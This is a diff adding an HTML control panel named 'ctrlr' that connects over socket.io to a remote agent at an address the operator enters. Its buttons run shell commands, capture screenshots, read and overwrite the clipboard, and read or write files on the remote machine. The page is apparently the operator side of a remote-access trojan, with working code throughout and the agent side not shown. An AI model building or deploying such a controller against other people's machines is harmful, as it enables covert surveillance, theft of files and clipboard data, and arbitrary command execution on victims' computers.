@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ctrlr</title>
+    
+    <script src="node_modules/socket.io/client-dist/socket.io.js"></script>
+    <script defer>
+        var variable = {
+            address: "localhost",
+            port: 5051,
+        }
+
+        const socket = io(`ws://${prompt()}:${variable.port}`);
+        socket.on("connectionEstablished", (arg)=>{displayAppend("Connected!", "success")})
+        var reader = new FileReader();
+
+
+        // Functions
+        function selectFile(callback){
+            var input = document.createElement('input')
+            input.type = 'file'
+            input.onchange = (e) => { 
+                callback(e.target.files[0])
+            }
+            input.click()
+            input.remove()
+        }
+        function displayAppend(arg, option=null){
+            if (option=="image"){
+                document.getElementById("display").innerText = "Displaying IMG"
+                document.getElementById("imgDisplay").style.display = "block"
+                document.getElementById("imgDisplay").setAttribute("src", arg)
+            }else if(option=="success"){
+                document.getElementById("imgDisplay").style.display = "none"
+                document.getElementById("display").style.color = "#25ffb1"
+                document.getElementById("display").innerText = arg
+            }else if(option=="error"){
+                document.getElementById("imgDisplay").style.display = "none"
+                document.getElementById("display").style.color = "#fb1e46"
+                document.getElementById("display").innerText = arg
+            }else{
+                document.getElementById("imgDisplay").style.display = "none"
+                document.getElementById("display").style.color = "white"
+                document.getElementById("display").innerText = arg
+            }
+        }
+        function getID(){
+            if (document.getElementById("id").value == ""){
+                return Math.random().toString()
+            }else{
+                return document.getElementById("id").value
+            }
+        }
+
+        function runCmd(){
+            socket.emit("runCmd", {id: getID(), cmd: document.getElementById("input").value})
+            socket.on("returnCmd", (arg)=>{
+                if (arg.return.stdeer){
+                    displayAppend(arg.return.stdeer, "error")
+                }else{
+                    displayAppend(arg.return.stdout, "success")
+                }
+            })
+        }
+        function takeSS(){
+            socket.emit("takeScreenshot", {id: getID()})
+            socket.on("returnScreenshot", (arg)=>{
+                displayAppend(arg.return, "image")
+            })
+        }
+        function getCB(){
+            socket.emit("getClipboard", {id: getID()})
+            socket.on("returnClipboard", (arg)=>{
+                displayAppend(arg.return)
+            })
+        }
+        function setCB(){
+            socket.emit("copyToClipboard", {id: getID(), stringToCopy: document.getElementById("input").value})
+            socket.on("returnCopyToClipboard", (arg)=>{
+                displayAppend(arg.return)
+            })
+        }
+        function writeFile(){
+            socket.emit("writeFile", {id: getID(), directory: document.getElementById("input").value, bytesToWrite: prompt()})
+            socket.on("returnWriteFile", (arg)=>{
+                if(arg.return){displayAppend("File Successfully Written", "success")}
+                else{displayAppend("Error Writting File", "error")}
+            })
+        }
+        function readFile(){
+            socket.emit("readFile", {id: getID(), directory: document.getElementById("input").value})
+            socket.on("returnReadFile", (arg)=>{
+                if(arg.return!=false){
+                    displayAppend(arg.return, "success")
+                }else{displayAppend("Error Reading File", "error")}
+            })
+        }
+    </script>
+    <style>
+        /* Global */
+        body{
+            background: #101010;
+            color: white;
+            font-family: "Montserrat", "Roboto", Arial, Helvetica, sans-serif;
+        }
+
+        input{padding: 5px;margin: 5px 0px;color: white;background: #303030;border: 1px #505050 solid;border-radius: 5px;height: 30px;font-size: 18px;font-family: "Montserrat", "Roboto", Arial, Helvetica, sans-serif;margin-bottom: 20px;}
+        button{padding: 10px; margin: 5px;color: white;background: #303030;border: 1px #505050 solid;border-radius: 10px;transition: 100ms;font-family: "Montserrat", "Roboto", Arial, Helvetica, sans-serif;}
+        button:hover{background: #505050;transition: 150ms;}
+
+        #display{
+            height: 300px;
+            color: white;
+            background-color: #151515;
+            border: 1px #505050 solid;
+            overflow-y: auto;
+            border-radius: 10px;
+            padding: 5px;
+        }#imgDisplay{
+            position: absolute;
+            top: 9px;
+            display: none;
+            height: 300px;
+            border-radius: 10px;
+            padding: 5px;
+        }
+
+        .section{
+            display: flex;
+            flex-direction: column;
+            border: 2px #505050 solid;
+            border-radius: 10px;
+        }
+    </style>
+</head>
+<body>
+    <!-- <div><input id="address" type="text"> : <input id="port" type="text"><button>Connect</button></div> -->
+    <image id="imgDisplay">
+    <div id="display"></div>
+    <div style="border: none;padding: 10px;"  class="section">
+        ID<input id="id" type="text">
+        INPUT<input id="input" type="text">
+    </div>
+    <div class="section">
+        <button onclick="runCmd()">Run on CMD</button>
+        <button onclick="takeSS()">Take Screnshot</button>
+        <button onclick="getCB()">Get Clipboard</button>
+        <button onclick="setCB()">Copy to Clipboard</button>
+        <button onclick="writeFile()">Send File</button>
+        <button onclick="readFile()">Get File</button>
+    </div>
+
+</body>
+</html>
